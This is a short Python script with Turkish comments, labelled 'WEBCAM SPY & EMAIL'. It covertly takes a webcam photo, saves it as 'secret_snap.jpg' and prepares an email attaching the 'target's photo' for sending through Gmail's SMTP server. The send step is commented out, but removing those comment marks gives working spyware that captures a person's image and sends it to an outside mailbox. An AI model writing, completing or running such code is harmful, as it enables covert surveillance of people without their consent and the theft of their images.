import cv2
import smtplib
from email.message import EmailMessage

print("--- WEBCAM SPY & EMAIL ---")

# 1. Fotoğraf Çek
cap = cv2.VideoCapture(0)
if not cap.isOpened():
    print("Kamera bulunamadı.")
    exit()

ret, frame = cap.read()
if ret:
    cv2.imwrite("secret_snap.jpg", frame)
    print("📸 Fotoğraf çekildi: secret_snap.jpg")
cap.release()

# 2. Email Gönder (Ayarları girmen lazım)
SENDER = "senin_mailin@gmail.com"
PASSWORD = "uygulama_sifresi" # Gmail App Password
TARGET = "hedef_mail@gmail.com"

msg = EmailMessage()
msg['Subject'] = 'Webcam Log'
msg['From'] = SENDER
msg['To'] = TARGET
msg.set_content("Hedefin fotoğrafı ektedir.")

try:
    with open("secret_snap.jpg", 'rb') as f:
        file_data = f.read()
        file_name = f.name
    
    msg.add_attachment(file_data, maintype='image', subtype='jpeg', filename=file_name)

    # Gerçek gönderim için yorumu kaldır:
    # with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    #     smtp.login(SENDER, PASSWORD)
    #     smtp.send_message(msg)
    
    print("✅ Email (Simülasyon) gönderildi.")
except Exception as e:
    print(f"Mail hatası (Ayarları kontrol et): {e}")